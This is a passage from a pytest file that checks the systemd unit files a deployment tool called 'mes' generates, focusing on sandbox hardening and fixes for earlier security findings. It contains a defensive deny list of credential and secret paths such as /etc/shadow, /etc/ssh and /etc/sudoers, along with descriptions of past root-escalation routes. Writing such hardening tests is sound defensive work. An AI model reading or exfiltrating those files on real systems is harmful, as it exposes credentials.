"""Linux-independent checks of every system unit mes renders for a server (mes.units).

Three layers:

1. Golden files: the exact text of every unit of a sample project is compared with
   ``tests/golden/units/<unit name>``. After a deliberate change, regenerate them with
   ``MES_UPDATE_GOLDEN=1 uv run pytest tests/test_units.py`` and review the diff.
2. Structure: every file is parsed the way systemd reads it (sections, ``Key=Value``, no line
   continuations) and may only contain the directives mes means to write.
3. Hardening: every unit that runs project code runs as the project's account with the full
   sandbox, writes only the project's own folders, and has no network unless the job lists hosts.

Plus hostile values: names, run lines, schedules, sizes, hosts and paths that would add
directives or weaken the sandbox are refused before anything is rendered.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest

from mes import paths, units
from mes.errors import Refused
from mes.manifest import UI, Job, Project

import projects as helpers

GOLDEN = Path(__file__).parent / "golden" / "units"
UPDATE = os.environ.get("MES_UPDATE_GOLDEN") == "1"
MES = "/usr/local/bin/mes"
EASY_UI = "/usr/local/bin/easy-ui"
ROOT = "/var/lib/mes"

PROJECT_TOML = """
[project]
name = "demo"
title = "Demo"
version = "0.1.0"
apps = ["demo_app", "demo_tool"]

[ui]
refresh_after = ["demo-app.build"]
"""

APP_TOML = """
[app]
name = "demo-app"
command = "demo-app"

[jobs.sync]
run = "sync --days 3"
schedule = "*-*-* 06:00:00"
network = ["api.example.com", "auth.example.com"]
memory = "512M"
timeout = "20m"

[jobs.build]
run = "build '50% done' $HOME"
after = "sync"
writes = ["data"]

[jobs.hook]
run = "sync --quick"
webhook = true
writes = ["state"]

[jobs.export]
run = "export"
manual = true
"""

TOOL_TOML = """
[app]
name = "demo-tool"
command = "demo-tool"

[jobs.report]
run = "report"
after = "demo-app.build"
writes = []
"""

EXPECTED_FILES = sorted([
    "mes-demo.gate-read.socket", "mes-demo.gate-read@.service",
    "mes-demo.gate-write.socket", "mes-demo.gate-write@.service",
    "mes-demo.gate-deploy.socket", "mes-demo.gate-deploy@.service",
    "mes-demo.gate-publish.socket", "mes-demo.gate-publish@.service",
    "mes-demo.job.demo-app.sync.service", "mes-demo.job.demo-app.sync.timer", "mes-demo.net.demo-app.sync.service",
    "mes-demo.job.demo-app.build.service", "mes-demo.job.demo-tool.report.service",
    "mes-demo.job.demo-app.hook.service", "mes-demo.job.demo-app.hook.path",
    "mes-demo.job.demo-app.export.service",
    "mes-demo.ui-refresh.service",
    "mes-demo.webhook.socket", "mes-demo.webhook.service",
    "mes-demo.selftest.path", "mes-demo.selftest.service",
    "mes-demo.selftest-net.path", "mes-demo.selftest-net.service", "mes-demo.net.selftest.service",
])

SANDBOX_KEYS = {line.split("=", 1)[0] for line in units.SANDBOX_LINES + units.FS_LINES}
DIRECTIVES = {
    "Unit": {"Description", "Requires", "After", "Before", "OnSuccess"},
    "Service": SANDBOX_KEYS | {
        "Type", "User", "Group", "ExecCondition", "ExecStartPre", "ExecStart", "ExecStartPost", "ExecStopPost",
        "SuccessExitStatus", "WorkingDirectory", "Environment", "Slice",
        "MemoryMax", "MemorySwapMax", "TimeoutStartSec", "RuntimeMaxSec", "StandardInput", "StandardOutput",
        "StandardError", "ReadWritePaths", "InaccessiblePaths", "PrivateNetwork", "RestrictAddressFamilies",
        "IPAddressDeny", "TemporaryFileSystem", "BindPaths", "BindReadOnlyPaths", "RuntimeDirectory",
        "RuntimeDirectoryMode", "RuntimeDirectoryPreserve", "Restart", "RestartSec", "MemoryDenyWriteExecute",
        "LimitNOFILE",
    },
    "Timer": {"OnCalendar", "Persistent", "RandomizedDelaySec", "Unit"},
    "Path": {"PathModified", "Unit"},
    "Socket": {"ListenStream", "SocketUser", "SocketGroup", "SocketMode", "Accept", "MaxConnections", "Service",
               "DirectoryMode", "RemoveOnStop"},
    "Install": {"WantedBy"},
}


@pytest.fixture(scope="module")
def project(tmp_path_factory):
    return helpers.load(tmp_path_factory.mktemp("demo"), PROJECT_TOML, {"demo_app": APP_TOML, "demo_tool": TOOL_TOML})


@pytest.fixture(scope="module")
def layout():
    return paths.server_layout("demo", ROOT)


@pytest.fixture(scope="module")
def files(project, layout):
    return units.render_project(project, layout=layout, mes=MES, easy_ui=EASY_UI)


def directives(text: str) -> list[tuple[str, str, str]]:
    """Parse a unit like systemd would and check that it only holds directives mes means to write."""
    out = []
    section = None
    assert text.endswith("\n") and "\r" not in text
    for raw in text.split("\n"):
        assert not raw.endswith("\\"), f"line continuation in {raw!r}"
        assert not re.search(r"[\x00-\x08\x0b-\x1f\x7f]", raw), raw
        line = raw.strip()
        if not line or line[0] in "#;":
            continue
        if line.startswith("["):
            assert line.endswith("]"), raw
            section = line[1:-1]
            assert section in DIRECTIVES, section
            continue
        key, sep, value = line.partition("=")
        assert sep, f"not a directive: {raw!r}"
        assert section is not None, raw
        assert key in DIRECTIVES[section], f"unexpected directive {key!r} in [{section}]"
        out.append((section, key, value))
    return out


def values(text: str, key: str) -> list[str]:
    return [v for _, k, v in directives(text) if k == key]


def one(text: str, key: str) -> str:
    found = values(text, key)
    assert len(found) == 1, (key, found)
    return found[0]


def split_exec(value: str) -> list[str]:
    """Undo exec_line for a line of fully quoted words."""
    words = re.findall(r'"((?:[^"\\]|\\.)*)"', value)
    assert " ".join(f'"{w}"' for w in words) == value.lstrip("+")
    return [re.sub(r"\\(.)", r"\1", w).replace("%%", "%").replace("$$", "$") for w in words]


def _is_project_code(name: str) -> bool:
    if name.startswith("mes-demo.net."):
        return False  # the network helpers run as root and read nothing of the project
    return ".job." in name and name.endswith(".service") or name.endswith("@.service") \
        or name.endswith(".ui-refresh.service") or name.endswith(".webhook.service") \
        or name.endswith(".selftest.service") or name.endswith(".selftest-net.service")


# =========================================================================== golden files


def test_the_sample_project_renders_exactly_these_files(files):
    assert sorted(files) == EXPECTED_FILES
    for name in files:
        assert units.UNIT_NAME_RE.fullmatch(name)


@pytest.mark.parametrize("name", EXPECTED_FILES)
def test_golden(files, name):
    path = GOLDEN / name
    if UPDATE:
        GOLDEN.mkdir(parents=True, exist_ok=True)
        path.write_text(files[name])
    assert path.is_file(), f"missing golden file {path}; run with MES_UPDATE_GOLDEN=1 and review it"
    assert files[name] == path.read_text(), f"{name} changed; if on purpose, run with MES_UPDATE_GOLDEN=1"


def test_no_stale_golden_files():
    if GOLDEN.is_dir():
        assert sorted(p.name for p in GOLDEN.iterdir()) == EXPECTED_FILES


@pytest.mark.skipif(shutil.which("systemd-analyze") is None, reason="needs systemd-analyze (Linux)")
def test_systemd_analyze_accepts_the_units(files, tmp_path):
    for name, text in files.items():
        (tmp_path / name).write_text(text)
    res = subprocess.run(["systemd-analyze", "verify", "--man=no", *sorted(str(p) for p in tmp_path.iterdir())],
                         capture_output=True, text=True, check=False)
    bad = [line for line in res.stderr.splitlines() if "Unknown key" in line or "Invalid" in line]
    assert not bad, res.stderr


# =========================================================================== structure


def test_every_file_parses_into_known_directives_and_markers(files):
    for name, text in files.items():
        directives(text)
        assert text.startswith(units.HEADER + "\n"), name
        assert units.read_markers(text)[0] == "demo", name
        if (".job." in name or ".net." in name) and ".net.selftest." not in name:
            assert units.read_markers(text)[1] == ".".join(name.split(".")[2:4]), name


# =========================================================================== hardening


def _writable(text: str) -> list[str]:
    return [p.lstrip("-").split(":")[-1] for key in ("ReadWritePaths", "BindPaths") for v in values(text, key)
            for p in v.split()]


@pytest.mark.parametrize("name", [n for n in EXPECTED_FILES if _is_project_code(n)])
def test_project_code_runs_sandboxed_as_the_project_account(files, layout, name):
    text = files[name]
    assert one(text, "User") == "mes-demo" and one(text, "Group") == "mes-demo"
    assert one(text, "MemoryMax")
    assert one(text, "RestrictAddressFamilies")
    assert one(text, "Slice") == units.SLICE
    # Writable folders: only the project's own; of code/ only the release being installed and
    # uv's folders, and only for the install step.
    allowed = {str(layout.data), str(layout.state), str(layout.store), str(layout.ui), str(layout.webhook)}
    if "gate-deploy" in name:
        allowed = {str(layout.uv_cache), str(layout.uv_python), str(layout.installing)}
    if name.endswith((".selftest.service", ".selftest-net.service")):
        allowed.add(f"{layout.gate}/selftest")  # the probe's answer: no job sees it
    for p in _writable(text):
        assert p in allowed, (name, p)
    # /var (so every other project and service), /run (every socket), /opt and /usr/local are
    # empty; only this project's folders come back.
    assert values(text, "TemporaryFileSystem") == ["/var:ro /run:ro /opt:ro /usr/local:ro"]
    shown = " ".join(values(text, "BindPaths") + values(text, "BindReadOnlyPaths")).split()
    for p in shown:
        src = p.split(":")[0].lstrip("-")
        if src in ("/opt/mes", "/usr/local/bin", "/usr/local/lib", "/usr/local/lib64",
                   "/run/systemd/resolve/io.systemd.Resolve"):
            assert "gate-deploy" in name or src != "/run/systemd/resolve/io.systemd.Resolve", (name, p)
            continue
        assert src.startswith(str(layout.base) + "/") or src.startswith("/run/mes-demo-net/"), (name, p)
        assert not src.startswith(str(layout.auth)), (name, p)
        assert not src.startswith(str(layout.gate)) or (name.endswith(("selftest.service", "selftest-net.service"))
                                                         and src == f"{layout.gate}/selftest"), (name, p)
    # The webhook key, incoming archives and uv's cache are hidden from everything that runs
    # project code (the webhook receiver checks signatures with the key, so only it may read it).
    hidden = " ".join(values(text, "InaccessiblePaths")).split()
    hides_key = f"-{layout.webhook_key}" in hidden
    assert hides_key == (name != "mes-demo.webhook.service"), name
    env = values(text, "Environment")
    assert '"MES_PROJECT=demo"' in env and f'"MES_DATA_DIR={layout.data}"' in env
    assert not any("PATH=" in e and "MES_" not in e for e in env if e.startswith('"PATH='))


def _every_account_unit(files):
    return {n: t for n, t in files.items() if values(t, "User") and values(t, "User")[0].startswith("mes-demo")}


def test_every_unit_of_a_project_account_has_the_whole_hardening_block(files, layout, tmp_path):
    """Finding C: one shared block, so no unit can drift. Only UMask=, SystemCallFilter= and
    TasksMax= may differ (the install step's system calls, group-readable ui files, the web server's
    task limit)."""
    from mes import server

    web = units.render_web(_demo_project(tmp_path), layout=layout, params={
        "exec": EASY_UI, "ui_dir": str(layout.ui), "auth_dir": str(layout.auth), "socket": units.web_socket_path("demo"),
        "memory_max": "256M", "origins": ["https://my-server.example.ts.net"]})
    checked = {**_every_account_unit(files), **_every_account_unit(web)}
    assert len(checked) >= 14 and "mes-demo-web.service" in checked
    required = [ln for ln in units.SANDBOX_LINES + units.FS_LINES if not ln.startswith(units.HARDENING_OVERRIDABLE)]
    assert "PrivateIPC=yes" in required and "ProtectProc=invisible" in required and "KeyringMode=private" in required
    for name, text in checked.items():
        lines = text.split("\n")
        for line in required:
            assert line in lines, (name, line)
        assert len(values(text, "UMask")) == 1 and len(values(text, "TasksMax")) == 1, name
        assert values(text, "SystemCallFilter")[0] == "@system-service", name
        assert "~@privileged" in " ".join(values(text, "SystemCallFilter")), name
    # The interactive command an owner runs gets the same block.
    cmd = units.interactive_command(_demo_project(tmp_path), layout, ["demo-app", "login"])
    props = [cmd[i + 1] for i, w in enumerate(cmd) if w == "-p"]
    for line in required:
        assert line in props, line
    assert server  # (imported for the run-as test below)


def _demo_project(tmp_path):
    return helpers.load(tmp_path / "demo-copy", PROJECT_TOML, {"demo_app": APP_TOML, "demo_tool": TOOL_TOML})


def test_secrets_and_service_sockets_are_hidden(files):
    """Findings B and C: no service socket of the server and no secret of /etc is reachable."""
    for name, text in _every_account_unit(files).items():
        hidden = " ".join(values(text, "InaccessiblePaths")).split()
        for p in ("/etc/shadow", "/etc/gshadow", "/etc/ssh", "/etc/sudoers", "/etc/sudoers.d", "/etc/NetworkManager",
                  "/etc/wireguard", "/etc/docker", "/etc/tailscale", "/etc/ssl/private", "/srv", "/mnt", "/media",
                  "/boot"):
            assert f"-{p}" in hidden, (name, p)
        # /run is an empty folder: systemd's private socket, D-Bus, resolved, userdb, the journal,
        # Tailscale, Docker, containerd, Podman, nscd, CUPS, Avahi and the gate's sockets are gone.
        assert "/run:ro" in one(text, "TemporaryFileSystem").split(), name
        assert "/var:ro" in one(text, "TemporaryFileSystem").split(), name
        binds = " ".join(values(text, "BindPaths") + values(text, "BindReadOnlyPaths")).split()
        under_run = [b for b in binds if b.lstrip("-").split(":")[-1].startswith("/run/")]
        if "gate-deploy" in name:
            assert under_run == ["-/run/systemd/resolve/io.systemd.Resolve"], name  # name lookups for uv
        else:
            assert under_run == [], (name, under_run)
        assert "/run/user" not in " ".join(binds)


def test_uv_cache_and_python_are_writable_only_by_the_install_step(files, layout):
    """Finding A3: a later deploy must not trust cache content that project code could have written."""
    for name, text in files.items():
        if not values(text, "User"):
            continue
        writable = _writable(text)
        for p in writable:
            assert not (p == str(layout.code) or str(layout.code).startswith(p + "/")), (name, p)
        if name == "mes-demo.gate-deploy@.service":
            assert str(layout.uv_cache) in writable and str(layout.installing) in writable
            continue
        assert not any(p.startswith(str(layout.code) + "/") for p in writable), (name, writable)
        if str(layout.code) in " ".join(values(text, "BindReadOnlyPaths")).split():
            assert f"-{layout.uv_cache}" in " ".join(values(text, "InaccessiblePaths")).split(), name


@pytest.mark.parametrize("name", [n for n in EXPECTED_FILES if _is_project_code(n) and "gate-deploy" not in n
                                  and "sync" not in n and "selftest-net" not in n])
def test_no_network_unless_declared(files, name):
    text = files[name]
    assert one(text, "PrivateNetwork") == "yes"
    assert one(text, "RestrictAddressFamilies") == "AF_UNIX"
    assert one(text, "IPAddressDeny") == "any"


def test_job_with_hosts_reaches_only_what_the_helper_allows(files):
    sync = files["mes-demo.job.demo-app.sync.service"]
    assert values(sync, "PrivateNetwork") == []
    # It shares the server's network (and its abstract unix sockets), so it opens no unix socket.
    assert one(sync, "RestrictAddressFamilies") == "AF_INET AF_INET6"
    assert one(sync, "IPAddressDeny") == "any"
    assert one(sync, "Requires") == "mes-demo.net.demo-app.sync.service"
    assert one(sync, "After") == "mes-demo.net.demo-app.sync.service"
    assert "# network: only api.example.com, auth.example.com" in sync
    # Its own hosts file is its only name lookup: no DNS server, no system name service.
    assert "/run/mes-demo-net/demo-app.sync/hosts:/etc/hosts" in values(sync, "BindReadOnlyPaths")
    assert "/run:ro" in one(sync, "TemporaryFileSystem").split()  # no resolved, no D-Bus

    net = files["mes-demo.net.demo-app.sync.service"]
    assert values(net, "User") == []  # root: only root may change another unit's settings
    assert split_exec(one(net, "ExecStart")) == [
        *units.ROOT_ENV, units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "jobs", "allow-network",
        "--unit", "mes-demo.job.demo-app.sync.service", "--hosts-file", "/run/mes-demo-net/demo-app.sync/hosts", "--",
        "api.example.com", "auth.example.com"]
    assert one(net, "CapabilityBoundingSet") == "CAP_SYS_ADMIN"
    assert one(net, "Before") == "mes-demo.job.demo-app.sync.service"
    assert one(net, "RuntimeDirectory") == "mes-demo-net/demo-app.sync"
    for line in ("NoNewPrivileges=yes", "ProtectSystem=strict", "ProtectHome=yes", "PrivateTmp=yes",
                 "SystemCallFilter=@system-service"):
        assert line in net.split("\n")
    assert values(net, "ReadWritePaths") == [] and values(net, "WorkingDirectory") == ["/"]


def test_job_service_runs_the_app_and_records_as_root(files, layout):
    sync = files["mes-demo.job.demo-app.sync.service"]
    assert one(sync, "Type") == "oneshot"
    assert split_exec(one(sync, "ExecStart")) == [
        f"{layout.current_project}/.venv/bin/demo-app", "--json", "sync", "--days", "3"]
    post = one(sync, "ExecStopPost")
    assert post.startswith("+")
    # Root gets only names and the fixed server folder, never anything from the project's files,
    # and starts from an empty environment with Python in isolated mode.
    assert split_exec(post) == [*units.ROOT_ENV, units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "jobs", "record",
                                "--project", "demo", "--server-root", ROOT, "demo-app.sync"]
    # A job that may write data first brings the shared database in line with project.toml: mes
    # itself, as the project's account, with the same empty environment and isolated Python, and
    # a HOME the project cannot write.
    pre = split_exec(one(sync, "ExecStartPre"))
    assert not one(sync, "ExecStartPre").startswith("+")
    assert pre[:4] == list(units.ROOT_ENV) and "HOME=/nonexistent" in pre and "MES_CONFIG=/nonexistent" in pre
    assert f"MES_DATA_DIR={layout.data}" in pre and "MES_PROJECT=demo" in pre and "MES_ALLOW=write" in pre
    assert not any(w.startswith("HOME=") and w != "HOME=/nonexistent" for w in pre)
    i = pre.index(units.DEFAULT_MES_PYTHON)
    assert pre[i:] == [units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "db", "sync", "--quiet", "--project-dir",
                       str(layout.current_project)]
    assert f'"MES_PROJECT_DIR={layout.current_project}"' in values(sync, "Environment")
    assert one(sync, "MemoryMax") == "512M" and one(sync, "MemorySwapMax") == "0"
    assert one(sync, "TimeoutStartSec") == "1200"
    assert one(sync, "UMask") == "0077"
    assert one(sync, "WorkingDirectory") == str(layout.current_project)
    assert '"MES_ALLOW=write"' in values(sync, "Environment")
    assert '"MES_JOB=demo-app.sync"' in values(sync, "Environment")
    assert one(sync, "ReadWritePaths") == f"{layout.data} {layout.store} {layout.state}"
    assert one(sync, "TemporaryFileSystem").split()[0] == "/var:ro"
    assert "[Install]" not in sync
    report = files["mes-demo.job.demo-tool.report.service"]
    assert split_exec(one(report, "ExecStart"))[0] == f"{layout.current_project}/.venv/bin/demo-tool"
    assert values(report, "ReadWritePaths") == []  # writes = []
    assert values(report, "ExecStartPre") == []  # it may not write data, so no schema sync
    hook = files["mes-demo.job.demo-app.hook.service"]
    assert one(hook, "ReadWritePaths") == str(layout.state) and values(hook, "ExecStartPre") == []


def test_root_helpers_get_an_empty_environment_and_isolated_python(files):
    """Finding 4: root ran 'mes jobs record' with the job's HOME (state/, project-writable), so a
    user site-packages .pth there ran as root. Now root's commands start from env -i and python -I.
    The same holds for the db sync step a job runs first (as the project's account)."""
    seen_pre = 0
    for name, text in files.items():
        for key in ("ExecStopPost", "ExecStart", "ExecStartPre"):
            for v in values(text, key):
                if v.startswith("+") or name.startswith("mes-demo.net.") or key == "ExecStartPre":
                    argv = split_exec(v.lstrip("+"))
                    assert argv[:4] == list(units.ROOT_ENV), (name, v)
                    i = argv.index(units.DEFAULT_MES_PYTHON)
                    assert argv[i:i + 4] == [units.DEFAULT_MES_PYTHON, "-I", "-m", "mes"], (name, v)
                    assert all("=" in w for w in argv[4:i]), (name, v)  # only variables before Python
                    seen_pre += key == "ExecStartPre"
    assert seen_pre >= 2  # sync and build write data


def test_job_with_local_network_hosts(layout, tmp_path):
    p = helpers.load(tmp_path / "ln", '[project]\nname = "demo"\napps = ["demo_x"]\n',
                     {"demo_x": '[app]\nname = "demo-x"\ncommand = "demo-x"\n[jobs.x]\nrun = "x"\nmanual = true\n'
                                'network = ["api.example.com"]\nlocal_network = ["nas.home.arpa"]\n'})
    f = units.render_project(p, layout=layout, mes=MES)
    argv = split_exec(one(f["mes-demo.net.demo-x.x.service"], "ExecStart"))
    assert argv[argv.index("--local") + 1] == "nas.home.arpa"
    assert argv[argv.index("--") + 1:] == ["api.example.com", "nas.home.arpa"]
    assert "nas.home.arpa may be on the local network" in f["mes-demo.job.demo-x.x.service"]


def test_after_chain_and_dashboard_refresh(files):
    assert one(files["mes-demo.job.demo-app.sync.service"], "OnSuccess") == "mes-demo.job.demo-app.build.service"
    # A job of another app waits for build (after = "demo-app.build").
    assert one(files["mes-demo.job.demo-app.build.service"], "OnSuccess") == \
        "mes-demo.job.demo-tool.report.service mes-demo.ui-refresh.service"
    assert values(files["mes-demo.job.demo-tool.report.service"], "OnSuccess") == []
    ui = files["mes-demo.ui-refresh.service"]
    assert split_exec(one(ui, "ExecStart")) == [
        EASY_UI, "--json", "--project-dir", f"{ROOT}/demo/code/current/project", "data", "build"]
    assert one(ui, "UMask") == "0027" and one(ui, "ReadWritePaths") == f"{ROOT}/demo/ui"
    assert f"{ROOT}/demo/code {ROOT}/demo/data {ROOT}/demo/state" in values(ui, "BindReadOnlyPaths")
    assert '"MES_ALLOW=read"' in values(ui, "Environment")
    assert f'"MES_ROOT={ROOT}"' in values(ui, "Environment")  # how easy-ui finds the server layout
    assert f'"MES_ROOT={ROOT}"' in values(files["mes-demo.gate-publish@.service"], "Environment")
    assert not any("EASYUI_STATE_HOME" in t for t in files.values())


def test_quotes_percent_and_dollar_in_run_lines(files):
    build = files["mes-demo.job.demo-app.build.service"]
    start = one(build, "ExecStart")
    assert '"50%% done" "$$HOME"' in start
    assert split_exec(start)[-2:] == ["50% done", "$HOME"]


def test_timer_and_webhook_path(files, layout):
    timer = files["mes-demo.job.demo-app.sync.timer"]
    assert one(timer, "OnCalendar") == "*-*-* 06:00:00"
    assert one(timer, "Persistent") == "true"
    assert one(timer, "RandomizedDelaySec") == str(units.RANDOM_DELAY_SEC)
    assert one(timer, "Unit") == "mes-demo.job.demo-app.sync.service"
    assert one(timer, "WantedBy") == "timers.target"
    path = files["mes-demo.job.demo-app.hook.path"]
    assert one(path, "PathModified") == f"{layout.triggers}/demo-app.hook"
    assert one(path, "Unit") == "mes-demo.job.demo-app.hook.service"
    for name in ("mes-demo.job.demo-app.export.service", "mes-demo.job.demo-app.build.service"):
        assert name.replace(".service", ".timer") not in files


def test_webhook_receiver(files, layout):
    sock = files["mes-demo.webhook.socket"]
    assert one(sock, "ListenStream") == "/run/mes-demo-webhook.sock"
    assert one(sock, "SocketUser") == "root" and one(sock, "SocketMode") == "0600"
    assert one(sock, "Accept") == "no"
    svc = files["mes-demo.webhook.service"]
    assert split_exec(one(svc, "ExecStart")) == [MES, "webhook", "serve", "--project", "demo", "--server-root", ROOT]
    # Finding 10: it sees etc/ (the root-owned job list and secret) and its own folder, never code/.
    assert one(svc, "ReadWritePaths") == str(layout.webhook)
    assert str(layout.etc) in values(svc, "BindReadOnlyPaths")
    assert str(layout.code) not in svc and str(layout.data) + " " not in svc


@pytest.mark.parametrize("level", units.SANDBOX_LEVELS)
def test_gate_instances(files, layout, level):
    sock = files[f"mes-demo.gate-{level}.socket"]
    assert one(sock, "ListenStream") == units.gate_socket_path("demo", level) == f"/run/mes-demo-gate/{level}.sock"
    assert one(sock, "SocketUser") == "mes-demo" and one(sock, "SocketGroup") == "mes-demo"
    assert one(sock, "SocketMode") == "0600" and one(sock, "Accept") == "yes"
    svc = files[f"mes-demo.gate-{level}@.service"]
    assert split_exec(one(svc, "ExecStart")) == [
        MES, "gate", "child", "--project", "demo", "--server-root", ROOT, "--level", level]
    assert one(svc, "StandardInput") == "socket" and one(svc, "StandardOutput") == "socket"
    hidden = " ".join(values(svc, "InaccessiblePaths")).split()
    assert {f"-{layout.webhook_key}", f"-{layout.incoming}"} <= set(hidden)
    assert "/run:ro" in one(svc, "TemporaryFileSystem").split()  # the gate's own sockets are not there
    rw = values(svc, "ReadWritePaths")
    if level == "read":
        assert rw == []
    elif level == "write":
        assert rw == [f"{layout.data} {layout.state} {layout.store}"]
    elif level == "publish":
        assert rw == [str(layout.ui)]
        assert one(svc, "PrivateNetwork") == "yes" and one(svc, "UMask") == "0027"
    else:
        assert rw == []
        assert one(svc, "BindPaths") == f"-{layout.uv_cache} -{layout.uv_python} -{layout.installing}"
        assert values(svc, "PrivateNetwork") == []  # uv sync needs the package index
        assert one(svc, "RuntimeMaxSec") == "1800"
    assert one(files[f"mes-demo.gate-{level}.socket"], "MaxConnections") == \
        ("1" if level in ("deploy", "publish") else "4")


def test_the_install_step_sees_no_data_and_only_the_new_release_writable(files, layout):
    """Finding A1/A2: the internet-facing deploy sandbox could write every release, ui/ and read
    data/ (login tokens). Now it binds no data, state, store, ui or gate, and of code/ only uv's
    folders and the link code/installing (the release being installed) are writable."""
    svc = files["mes-demo.gate-deploy@.service"]
    shown = " ".join(values(svc, "BindPaths") + values(svc, "BindReadOnlyPaths"))
    for folder in (layout.data, layout.state, layout.store, layout.ui, layout.gate, layout.auth, layout.webhook):
        assert str(folder) not in shown, folder
    assert f"{layout.etc} {layout.code}" in values(svc, "BindReadOnlyPaths")
    assert values(svc, "ReadWritePaths") == []
    assert '"MES_ROOT=/var/lib/mes"' not in values(svc, "Environment")  # it publishes nothing
    pub = files["mes-demo.gate-publish@.service"]
    shown = " ".join(values(pub, "BindPaths") + values(pub, "BindReadOnlyPaths"))
    assert str(layout.data) not in shown and str(layout.state) not in shown
    assert one(pub, "IPAddressDeny") == "any" and one(pub, "RestrictAddressFamilies") == "AF_UNIX"


def test_deploy_sandbox_tools_are_out_of_reach_of_jobs(files, layout):
    """Finding 6: uv's cache and Python lived in state/, which jobs and the write key can change."""
    svc = files["mes-demo.gate-deploy@.service"]
    env = values(svc, "Environment")
    assert f'"UV_CACHE_DIR={layout.code}/uv-cache"' in env
    assert f'"UV_PYTHON_INSTALL_DIR={layout.code}/uv-python"' in env
    assert '"UV_NO_CONFIG=1"' in env and '"UV_LINK_MODE=copy"' in env and '"HOME=/nonexistent"' in env
    assert not any(str(layout.state) in e for e in env if e.startswith(('"UV_', '"HOME')))


def test_deploy_sandbox_cannot_reach_this_computer_or_the_local_network(files):
    """Finding 8: uv sync ran with unrestricted network."""
    deny = one(files["mes-demo.gate-deploy@.service"], "IPAddressDeny").split()
    for net in ("127.0.0.0/8", "::1/128", "169.254.0.0/16", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
                "100.64.0.0/10", "fc00::/7", "fe80::/10", "224.0.0.0/4", "ff00::/8"):
        assert net in deny
    assert values(files["mes-demo.gate-deploy@.service"], "IPAddressAllow") == []


def test_temporary_exit_is_skipped_and_stops_the_chain(files):
    """Finding H: exit code 75 counted as a failure; now it is a success for systemd (so
    'systemctl --failed' stays meaningful) and root skips what waits for it."""
    for name, text in files.items():
        if ".job." in name and name.endswith(".service"):
            assert one(text, "SuccessExitStatus") == "75", name
    build = files["mes-demo.job.demo-app.build.service"]  # after = "sync"
    cond = one(build, "ExecCondition")
    assert cond.startswith("+")
    assert split_exec(cond) == [*units.ROOT_ENV, units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "jobs", "should-run",
                                "--project", "demo", "--server-root", ROOT, "--", "demo-app.sync"]
    report = files["mes-demo.job.demo-tool.report.service"]
    assert split_exec(one(report, "ExecCondition"))[-1] == "demo-app.build"
    assert values(files["mes-demo.job.demo-app.sync.service"], "ExecCondition") == []  # scheduled, no upstream
    ui = files["mes-demo.ui-refresh.service"]
    assert split_exec(one(ui, "ExecCondition"))[-2:] == ["--", "demo-app.build"]


def test_dashboard_refresh_publishes_the_first_time(files, layout):
    """Finding E: the first deploy cannot publish (no data yet); the refresh after the first data
    publishes when nothing is published, as the project's account in the same sandbox."""
    ui = files["mes-demo.ui-refresh.service"]
    post = one(ui, "ExecStartPost")
    assert not post.startswith("+")
    argv = split_exec(post)
    assert argv[:4] == list(units.ROOT_ENV) and "HOME=/nonexistent" in argv and "MES_ROOT=/var/lib/mes" in argv
    i = argv.index(units.DEFAULT_MES_PYTHON)
    assert argv[i:] == [units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "server", "first-publish", "demo",
                        "--server-root", ROOT, "--easy-ui", EASY_UI]


def test_selftest_net_probe_is_rendered_like_a_job_with_hosts(files, layout):
    """Finding G: the self-test never probed the sandbox real jobs with network = [...] get."""
    net = files["mes-demo.selftest-net.service"]
    sync = files["mes-demo.job.demo-app.sync.service"]
    for key in ("RestrictAddressFamilies", "IPAddressDeny", "TemporaryFileSystem", "InaccessiblePaths"):
        assert values(net, key) == values(sync, key), key
    assert values(net, "PrivateNetwork") == []
    assert f"{units.selftest_hosts_file('demo')}:/etc/hosts" in values(net, "BindReadOnlyPaths")
    assert one(net, "Requires") == one(net, "After") == "mes-demo.net.selftest.service"
    assert split_exec(one(net, "ExecStart"))[-4:] == ["--context", "net", "--server-root", ROOT]
    helper = files["mes-demo.net.selftest.service"]
    assert split_exec(one(helper, "ExecStart"))[-8:] == [
        "allow-network", "--selftest", "--unit", "mes-demo.selftest-net.service", "--hosts-file",
        "/run/mes-demo-net/selftest/hosts", "--", units.SELFTEST_HOST]
    assert one(helper, "Before") == "mes-demo.selftest-net.service" and values(helper, "User") == []
    path = files["mes-demo.selftest-net.path"]
    assert one(path, "PathModified") == f"{layout.gate}/selftest-net-request"
    import ipaddress

    assert not ipaddress.ip_address(units.SELFTEST_ADDRESS).is_global  # documentation range: leads nowhere


def test_run_as_prints_a_sandboxed_systemd_run(tmp_path, layout):
    """Item J: interactive app commands (a login) run as the project's account in a transient
    sandboxed unit; mes only prints the command."""
    p = _demo_project(tmp_path)
    cmd = units.interactive_command(p, layout, ["demo-app", "login", "--user", "me"])
    assert cmd[:2] == ["systemd-run", "--pty"] and f"--slice={units.SLICE}" in cmd
    props = [cmd[i + 1] for i, w in enumerate(cmd) if w == "-p"]
    assert "User=mes-demo" in props and f"BindReadOnlyPaths={layout.code}" in props
    assert f"BindPaths={layout.data} {layout.store} {layout.state}" in props
    assert cmd[cmd.index("--") + 1:] == [f"{layout.current_project}/.venv/bin/demo-app", "login", "--user", "me"]
    assert any(x.startswith("IPAddressDeny=") and "127.0.0.0/8" in x for x in props)
    off = units.interactive_command(p, layout, ["demo-app", "login"], network=False)
    assert "PrivateNetwork=yes" in [off[i + 1] for i, w in enumerate(off) if w == "-p"]
    with pytest.raises(StopIteration):
        units.interactive_command(p, layout, ["not-an-app", "x"])


def test_selftest_probe_has_a_jobs_sandbox(files, layout):
    svc = files["mes-demo.selftest.service"]
    assert one(svc, "PrivateNetwork") == "yes" and one(svc, "User") == "mes-demo"
    assert split_exec(one(svc, "ExecStart")) == [MES, "server", "selftest-probe", "demo", "--context", "job",
                                                 "--server-root", ROOT]
    assert values(svc, "ExecStopPost") == [] and values(svc, "ExecStartPre") == []
    path = files["mes-demo.selftest.path"]
    assert one(path, "PathModified") == f"{layout.gate}/selftest-request"
    assert one(path, "Unit") == "mes-demo.selftest.service"


ONE_JOB = '[app]\nname = "demo-x"\ncommand = "demo-x"\n[jobs.x]\nrun = "x"\nmanual = true\n'


def test_project_without_ui_or_webhook_has_no_such_units(layout, tmp_path):
